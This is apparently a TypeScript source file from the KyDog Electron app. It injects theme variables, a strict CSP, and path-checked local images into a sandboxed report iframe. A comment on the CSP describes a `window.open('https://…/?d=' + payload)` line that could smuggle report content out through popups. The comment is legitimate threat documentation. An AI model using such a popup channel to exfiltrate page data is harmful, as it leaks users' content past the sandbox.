/**
 * 报告 iframe 的主题转发。
 *
 * CSS 自定义属性不跨 iframe 边界继承，`prefers-color-scheme` 又对不上 KyDog 的
 * 五套具名配色，所以只能把宿主当前的计算值注入进去。报告模板一律写
 * `var(--ink, #2a2620)` 这种带 fallback 的形态 —— app 里跟随主题，
 * 用浏览器单独打开时走 fallback，两边都成立。
 */

/**
 * 报告文档的 CSP。允许内联脚本与内联样式（报告的动效与版式全靠它们），
 * `default-src 'none'` + `connect-src 'none'` + `form-action 'none'` 让页面里的脚本
 * **发不出 fetch / XHR / WebSocket、也提交不了表单**，外部子资源（img / font / style）
 * 全部锁死在 `data:`。
 *
 * ⚠️ 它管不到 `window.open`：CSP 没有任何指令约束弹窗（`connect-src` 管的是
 * fetch/XHR/WS，`form-action` 管的是表单）。sandbox 串给了
 * `allow-popups allow-popups-to-escape-sandbox`（DOI 外链要用），而 main.ts 的
 * `setWindowOpenHandler` 会把任何 http(s) / mailto URL 交给 `shell.openExternal` ——
 * 也就是说报告里的脚本可以 `window.open('https://…/?d=' + payload)`，把它自己页面里的
 * 内容拼进 URL 带到系统浏览器里去，Electron 这一侧没有弹窗拦截、也不要求用户手势。
 * 边际风险很小（能带走的只有这份报告自己的内容 + 查看器从它自己目录树内联进来的图，
 * 且只在用户主动打开不可信 .html 时），但**别把「网络全封死」当成放宽沙箱的依据**——
 * 要真堵这条路得在 `setWindowOpenHandler` 里加 URL 策略，那是另一个独立决定。
 *
 * 这条串是实测过的原样：改动任何一项都要重新实测，不要凭直觉增删
 * （reportTheme.test.ts 用一条全串等值断言锁着它）。
 * 比 v1「不给 allow-scripts」的姿势严的地方在子资源：v1 挡脚本但不挡外部子资源请求。
 */
export const REPORT_CSP =
  "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; "
  + "img-src data:; font-src data:; connect-src 'none'; form-action 'none'";

/** 转发给报告的变量。清单由 reportTheme.test.ts 与 vellum.css 锁死。 */
export const HOST_THEME_VARS = [
  '--paper', '--paper-deep', '--paper-edge',
  '--ink', '--ink-soft', '--ink-faint', '--ink-hair', '--ink-hair-soft',
  '--accent', '--accent-soft', '--accent-hover',
  '--marginalia', '--moss', '--amber',
  '--font-serif', '--font-sans', '--font-mono',
] as const;

/**
 * 有意不转发的：这些是 app 外壳专用，报告里没有对应的东西。
 * 加新 token 时必须在这两个清单之一里登记，否则 reportTheme.test.ts 会红。
 */
export const NOT_FORWARDED_VARS = [
  '--grain-color', '--grain-size', '--grain-opacity',     // 窗口底纹
  '--titlebar-bg-from', '--titlebar-bg-to', '--titlebar-text',
  '--card-shadow', '--card-shadow-strong',
  '--hover-bg',
] as const;

/** 阅读字号，由 globals.css 的 :root[data-reading-size] 声明，不在各主题文件里。 */
export const HOST_SIZE_VARS = ['--reading-font-size', '--reading-line-height'] as const;

export function buildHostThemeCss(read: (name: string) => string): string {
  const lines: string[] = [];
  for (const name of [...HOST_THEME_VARS, ...HOST_SIZE_VARS]) {
    const value = read(name).trim();
    if (value === '') continue; // 宿主没定义 → 让报告走自己的 fallback
    lines.push(`  ${name}: ${value};`);
  }
  return `:root {\n${lines.join('\n')}\n}`;
}

/**
 * 把主题变量注入报告的 <head>。
 *
 * 用 DOMParser 而不是找 `</head>` 插字符串：后者在报告结构稍有变化时会静默失败
 * （没有 head 标签、head 出现在注释里、大小写不同）。DOMParser 产出的是惰性
 * document —— 不执行脚本、不加载资源。
 *
 * 只在渲染进程可用（vitest 是 node 环境，没有 DOMParser），因此本函数由 e2e 覆盖。
 *
 * 特意留成同步函数（本地图片内联 —— 唯一需要 `await` 磁盘 I/O 的部分 —— 被拆到了
 * `inlineLocalImages` 里，见下方的分工说明）：`HtmlFileTab` 每次切主题 / 调阅读字号
 * 都会重跑这个函数，同步意味着切主题不会经过一次 promise 微任务，也不需要
 * cancelled 守卫 —— 函数体内没有 await 边界，不存在「旧调用的结果比新调用晚落地」
 * 这回事。
 */
export function injectHostTheme(html: string, css: string): string {
  const doc = new DOMParser().parseFromString(html, 'text/html');

  // srcdoc 文档的 base URL 继承自宿主，导致 href="#x" 解析成 <宿主URL>#x，
  // 被当成跨文档导航 —— 页内锚点会失效（file:// 下静默无效，http 下把 frame
  // 导航到宿主页面）。钉死 base 才能让 #锚点 成为同文档片段导航。
  // 顺带把任意来路 .html 里的相对 URL 也钉在 about:srcdoc 上，它们本来会
  // 解析到宿主页面路径，既没用又是一次多余的本地请求。
  if (!doc.querySelector('base[href]')) {
    const base = doc.createElement('base');
    base.href = 'about:srcdoc';
    doc.head.prepend(base);
  }

  // CSP 必须是 head 的第一个节点：它只约束在它之后解析的内容。
  const csp = doc.createElement('meta');
  csp.setAttribute('http-equiv', 'Content-Security-Policy');
  csp.setAttribute('content', REPORT_CSP);
  doc.head.prepend(csp);

  const style = doc.createElement('style');
  style.id = 'kydog-host-theme';
  style.textContent = css;
  doc.head.append(style);

  return `<!doctype html>\n${doc.documentElement.outerHTML}`;
}

// ── 本地图片内联 ──
//
// 背景：C.4 允许报告插原图，B.1 给了严格 CSP（img-src data:）。两条合起来意味着
// agent 得自己把图片 base64 打进 HTML —— 一张 100KB 图约 13 万字符、几万 token，
// 还极易出错。改成查看器渲染时内联：报告写相对路径 <img src="figs/a.png">，
// 这里读文件转 data URI 写回去。agent 一个 base64 字符都不用打，CSP 一个字都不用放宽。
//
// 跟 injectHostTheme 拆成两个独立阶段（Task 7b review Important 2）：这里只处理
// 图片，不碰主题 CSS。原因是 `HtmlFileTab` 的 srcDoc 依赖 [html, theme,
// readingFontSize]，如果内联揉进同一个函数，切一次主题 / 调一次阅读字号就会把
// 报告里所有本地图片重新读盘 + 重新 base64 一遍 —— 这些操作跟图片内容毫无关系，
// 不该触发任何磁盘 I/O。拆开后 `inlineLocalImages(html, baseDir)` 只在 html 或
// baseDir 变化（文件重新加载 / 换了报告）时跑一次，`injectHostTheme` 则可以退回
// 同步函数，随便切主题都不用等 promise。代价是 injectHostTheme 会对（已经内联过
// 图片的）html 再 `new DOMParser().parseFromString` 一次 —— 这次重新解析不碰磁盘，
// 纯 DOM 操作，比起「切主题重读图片文件」这个量级的浪费可以忽略。
//
// 安全边界（路径来自报告内容，报告可能不是本会话生成的，需当不可信输入处理）：
//   1. 字符串层校验（resolveInlineTarget）：只认报告文件所在目录树内的路径，
//      逃出的（`../`、绝对路径、盘符、反斜杠）拒绝；扩展名白名单
//      png/jpg/jpeg/gif/webp。这道挡不住符号链接 —— 文件名和路径字符串都可以
//      看着完全合规，实际指向目录树外的任意文件。
//   2. realpath 层校验（主进程 `file.readBytesWithin`，见 fileService.ts）：
//      baseDir 与目标路径都取 realpath 后判定目标是否真的落在 baseDir 内，
//      符号链接逃逸在这一步被拒。两道校验各管一段，都要过。
//   3. 体积上限：单张 8MB、全篇合计 24MB（srcdoc 是一个字符串，太大拖垮 iframe
//      解析）。按文档顺序遍历、边读边累加 totalBytes——「先到先得」：排在前面的
//      图片吃满预算后，后面即使是一张很小的图也会被拒；不是「先算总量再一次性
//      决定」。这是有意的简化（一次性算总量需要先把所有图片都读一遍才能判断，
//      等于牺牲了「小图片不因为排在大图后面而被冤枉拒绝」这个次要公平性，换取
//      「读到哪张算哪张、不用倒回去重算」的简单实现），不是遗漏。
// 三道任一没过，或读文件失败（不存在/无权限/realpath 逃出目录树），都退化成
// 「移除 src、标 rejected、保留 alt」——显示成 alt 文字而不是坏图标，且不能让
// 整份报告渲染失败。

/** 白名单扩展名 → MIME，大小写不敏感（比较前调用方会 toLowerCase）。 */
const IMAGE_MIME_BY_EXT: Record<string, string> = {
  png: 'image/png',
  jpg: 'image/jpeg',
  jpeg: 'image/jpeg',
  gif: 'image/gif',
  webp: 'image/webp',
};

const MAX_IMAGE_BYTES = 8 * 1024 * 1024;        // 单张上限
const MAX_TOTAL_IMAGE_BYTES = 24 * 1024 * 1024; // 全篇合计上限

/**
 * 从报告文件的绝对路径推出它所在的目录（内联图片的 baseDir）。
 *
 * 不用 node:path：渲染进程 contextIsolation:true / nodeIntegration:false，
 * node 内置模块在这里不可用（见 main.ts webPreferences）。tab.path 在不同平台
 * 可能用 '/' 或 '\'，两种分隔符都认。
 */
export function dirnameOf(filePath: string): string {
  const idx = Math.max(filePath.lastIndexOf('/'), filePath.lastIndexOf('\\'));
  return idx === -1 ? '' : filePath.slice(0, idx);
}

/**
 * 把报告里 <img src> 的相对路径解析到磁盘绝对路径，同时做安全校验。
 * 通过 → 绝对路径；被拒（逃出 baseDir / 扩展名不认）→ null。
 *
 * 手写而不是 node:path.resolve + 事后判断是否在 baseDir 下：一是渲染进程没有
 * node 内置模块（同 dirnameOf），二是逐段吃掉 `..` 能在跳出 baseDir 的那一刻
 * 就地拒绝，语义比「拼完整路径再用字符串前缀判断逃逸」更直接、更不容易在
 * 边界情况（如 baseDir 恰好是另一路径的前缀）上出错。
 */
export function resolveInlineTarget(baseDir: string, src: string): string | null {
  // 反斜杠 / 前导斜杠 / windows 盘符：都是逃逸或非相对路径的信号，一律拒绝。
  // 报告里的 src 应该只用 '/' 写相对路径，没有合法场景需要反斜杠。
  if (!src || src.startsWith('/') || /^[a-zA-Z]:[\\/]/.test(src) || src.includes('\\')) {
    return null;
  }

  const dot = src.lastIndexOf('.');
  const ext = dot >= 0 ? src.slice(dot + 1).toLowerCase() : '';
  if (!(ext in IMAGE_MIME_BY_EXT)) return null;

  const segments: string[] = [];
  for (const part of src.split('/')) {
    if (part === '' || part === '.') continue;
    if (part === '..') {
      if (segments.length === 0) return null; // 逃出 baseDir
      segments.pop();
    } else {
      segments.push(part);
    }
  }
  if (segments.length === 0) return null;

  const sep = baseDir.includes('\\') && !baseDir.includes('/') ? '\\' : '/';
  const normalizedBase = baseDir.replace(/[\\/]+$/, '');
  return `${normalizedBase}${sep}${segments.join(sep)}`;
}

/**
 * Uint8Array → base64。分块喂 String.fromCharCode 而不是一次性 apply：
 * 单张图可以到 MAX_IMAGE_BYTES（8MB），一次性展开成函数实参会撑爆调用栈。
 */
export function bytesToBase64(bytes: Uint8Array): string {
  let binary = '';
  const chunkSize = 0x8000;
  for (let i = 0; i < bytes.length; i += chunkSize) {
    binary += String.fromCharCode(...bytes.subarray(i, i + chunkSize));
  }
  return btoa(binary);
}

/**
 * 从已解析的报告 document 里挑出「本地图片」候选：有非空 src，且不是已经内联的
 * data: 或会被 CSP 拦下的 http(s):（留着不动，让它退化成坏图标即可，改了反而
 * 可能掩盖作者的意图）。
 *
 * 依赖 DOMParser 产出的 document，vitest 的 node 环境没有 DOMParser/jsdom，
 * 因此这个函数不参与单测，由 e2e/46-html-tab.spec.ts 覆盖；resolveInlineTarget /
 * dirnameOf / bytesToBase64 等不碰 DOM 的纯逻辑单独测（见 reportTheme.test.ts）。
 */
export function collectLocalImageSrcs(doc: Document): HTMLImageElement[] {
  return Array.from(doc.querySelectorAll<HTMLImageElement>('img[src]')).filter((img) => {
    const src = img.getAttribute('src') ?? '';
    return src !== '' && !/^data:/i.test(src) && !/^https?:/i.test(src);
  });
}

/** 拒绝时的退化：去掉 src、标记 rejected，保留 alt —— 显示成 alt 文字而不是坏图标。 */
function rejectLocalImage(img: HTMLImageElement): void {
  img.removeAttribute('src');
  img.setAttribute('data-kydog-inline', 'rejected');
}

/**
 * 把 doc 里符合条件的本地图片就地替换成 data URI；不满足任一安全边界或读取失败的
 * 都走 rejectLocalImage，不抛出 —— 一张图出问题不该拖垮整份报告的渲染。
 *
 * 读文件走 `file.readBytesWithin` 而不是 `file.readBytes`：后者只按字面路径读，
 * 不会跟着符号链接再校验一次目标是否还在 baseDir 内 —— resolveInlineTarget 的
 * 字符串校验拦不住「路径字符串合规、实际是个指向目录树外的符号链接」这种向量，
 * 得靠主进程那道 realpath 校验补上（见文件顶部的安全边界说明）。
 */
async function inlineLocalImagesInDoc(doc: Document, baseDir: string): Promise<void> {
  let totalBytes = 0;
  for (const img of collectLocalImageSrcs(doc)) {
    const src = img.getAttribute('src') ?? '';
    const resolved = resolveInlineTarget(baseDir, src);
    if (resolved === null) {
      rejectLocalImage(img);
      continue;
    }
    try {
      const { bytes } = await window.kydog.invoke('file.readBytesWithin', { baseDir, path: resolved });
      if (bytes.length > MAX_IMAGE_BYTES || totalBytes + bytes.length > MAX_TOTAL_IMAGE_BYTES) {
        console.warn(`[kydog] 图片超出内联体积上限，退化为 alt 文字：${resolved}`);
        rejectLocalImage(img);
        continue;
      }
      totalBytes += bytes.length;
      const ext = src.slice(src.lastIndexOf('.') + 1).toLowerCase();
      img.setAttribute('src', `data:${IMAGE_MIME_BY_EXT[ext]};base64,${bytesToBase64(bytes)}`);
    } catch (err) {
      console.warn(`[kydog] 读取图片失败或路径校验未通过，退化为 alt 文字：${resolved}`, err);
      rejectLocalImage(img);
    }
  }
}

/**
 * `inlineLocalImagesInDoc` 的字符串入口：解析 html → 内联图片 → 序列化回字符串。
 * 是 `HtmlFileTab` 实际调用的那个 —— 只依赖 [html, baseDir]，跟主题/字号无关，
 * 见文件顶部「跟 injectHostTheme 拆成两个独立阶段」的说明。
 *
 * 只在渲染进程可用（同 injectHostTheme，vitest 没有 DOMParser），因此本函数由
 * e2e 覆盖，不参与单测。
 */
export async function inlineLocalImages(html: string, baseDir: string): Promise<string> {
  const doc = new DOMParser().parseFromString(html, 'text/html');
  await inlineLocalImagesInDoc(doc, baseDir);
  return `<!doctype html>\n${doc.documentElement.outerHTML}`;
}

/** 从宿主根元素读一个自定义属性的计算值。 */
export function readHostVar(name: string): string {
  return getComputedStyle(document.documentElement).getPropertyValue(name);
}
